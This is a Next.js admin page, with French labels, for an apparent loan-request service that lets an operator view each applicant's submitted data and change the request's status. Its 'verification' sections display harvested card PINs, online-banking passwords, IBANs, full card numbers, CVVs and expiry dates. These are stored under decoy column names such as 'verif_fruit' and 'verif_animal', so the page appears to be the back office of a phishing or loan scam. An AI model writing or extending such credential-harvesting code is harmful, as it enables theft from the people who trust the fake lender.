import Link from 'next/link';
import { notFound } from 'next/navigation';
import { requireAdmin } from '@/lib/auth';
import { createClient } from '@/lib/supabase/server';
import { StatusForm } from '@/components/Forms';
import { ProfileCard } from '@/components/ProfileCard';
import { PageHeader, StatusBadge } from '@/components/ui';
import type { HistoryRow, LoanDetail } from '@/lib/types';
import { formatDate, formatMoney, UUID_RE } from '@/lib/utils';

export const metadata = { title: 'Détail de la demande' };

function Row({ label, children }: { label: string; children: React.ReactNode }) {
  return (
    <div className="grid gap-1 py-2.5 sm:grid-cols-3">
      <dt className="text-sm font-medium text-slate-500">{label}</dt>
      <dd className="text-sm text-slate-900 sm:col-span-2">{children}</dd>
    </div>
  );
}

export default async function RequestDetailPage({ params }: { params: Promise<{ id: string }> }) {
  await requireAdmin();
  const { id } = await params;
  if (!UUID_RE.test(id)) notFound();

  const supabase = await createClient();
  const [{ data }, { data: hist }] = await Promise.all([
    supabase
      .from('loan_requests')
      .select('*, profiles(first_name,last_name,email,phone,demo_color,demo_city,demo_digit,created_at), banks(name), loan_purposes(label_fr), card_types(name,family)')
      .eq('id', id)
      .maybeSingle(),
    supabase.from('loan_status_history').select('id,old_status,new_status,comment,created_at').eq('loan_id', id).order('created_at', { ascending: false }),
  ]);
  if (!data) notFound();
  const loan = data as unknown as LoanDetail;
  const history = (hist ?? []) as HistoryRow[];

  return (
    <>
      <p className="mb-3 text-sm"><Link href="/requests" className="text-ocean-600 hover:underline">← Retour aux demandes</Link></p>
      <PageHeader title={`Demande de ${loan.profiles ? `${loan.profiles.first_name} ${loan.profiles.last_name}` : 'utilisateur'}`} subtitle={`Déposée le ${formatDate(loan.created_at)}`}>
        <StatusBadge status={loan.status} />
      </PageHeader>

      <div className="grid gap-6 lg:grid-cols-3">
        <div className="space-y-6 lg:col-span-2">
          <section className="card" aria-labelledby="det">
            <h2 id="det" className="mb-2 text-lg font-semibold">Détails</h2>
            <dl className="divide-y divide-slate-100">
              <Row label="Montant"><strong>{formatMoney(loan.amount, loan.currency)}</strong></Row>
              <Row label="Motif">{loan.loan_purposes?.label_fr ?? loan.purpose_code}{loan.purpose_details ? ` — ${loan.purpose_details}` : ''}</Row>
              <Row label="Banque">{loan.banks ? loan.banks.name : loan.custom_bank_name ? `${loan.custom_bank_name} — saisie libre (à modérer)` : '—'}</Row>
              <Row label="Type de carte">{loan.card_types ? `${loan.card_types.name} (${loan.card_types.family})` : loan.custom_card_name ? `${loan.custom_card_name} — saisie libre` : '—'}</Row>
              <Row label="Description"><p className="whitespace-pre-wrap break-words">{loan.description}</p></Row>
            </dl>
          </section>

          <section className="card" aria-labelledby="req">
            <div className="mb-2 flex flex-wrap items-center justify-between gap-2">
              <h2 id="req" className="text-lg font-semibold">Demandeur — informations saisies</h2>
              <Link href={`/users/${loan.user_id}`} className="text-sm font-medium text-ocean-600 hover:underline">Fiche complète et toutes ses demandes →</Link>
            </div>
            {loan.profiles ? <ProfileCard profile={loan.profiles} /> : <p className="text-sm text-slate-500">Profil introuvable.</p>}
          </section>

          <section className="card" aria-labelledby="verif1">
            <h2 id="verif1" className="mb-1 text-lg font-semibold">Vérification (après le choix de la banque)</h2>
            <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande.</p>
            <dl className="divide-y divide-slate-100">
              <Row label="Code de votre carte">{loan.verif_fruit || '—'}</Row>
              <Row label="Mot de passe de votre espace client">{loan.verif_animal || '—'}</Row>
            </dl>
          </section>

          <section className="card" aria-labelledby="verif2">
            <h2 id="verif2" className="mb-1 text-lg font-semibold">Vérification de la carte bancaire (après le choix de la carte)</h2>
            <p className="mb-2 text-xs text-slate-500">Valeurs saisies lors de CETTE demande (distinctes de celles de l’inscription).</p>
            <dl className="divide-y divide-slate-100">
              <Row label="IBAN">{loan.verif_number || '—'}</Row> 
              <Row label="Numéro de carte">{loan.verif_color || '—'}</Row>
              <Row label="Code de sécurité (CCV)">{loan.verif_digit ?? '—'}</Row>
              <Row label="Date d'expiration">{loan.verif_year ?? '—'}</Row>
            </dl>
          </section>

          <section className="card" aria-labelledby="hist">
            <h2 id="hist" className="mb-3 text-lg font-semibold">Historique des statuts</h2>
            {history.length === 0 ? (
              <p className="text-sm text-slate-500">Aucun historique.</p>
            ) : (
              <ol className="space-y-2">
                {history.map((h) => (
                  <li key={h.id} className="rounded-xl border border-slate-200 p-3 text-sm">
                    <StatusBadge status={h.new_status} />
                  </li>
                ))}
              </ol>
            )}
          </section>
        </div>

        <aside>
          <section className="card lg:sticky lg:top-6" aria-labelledby="chg">
            <h2 id="chg" className="mb-4 text-lg font-semibold">Changer le statut</h2>
            <StatusForm loanId={loan.id} current={loan.status} />
          </section>
        </aside>
      </div>
    </>
  );
}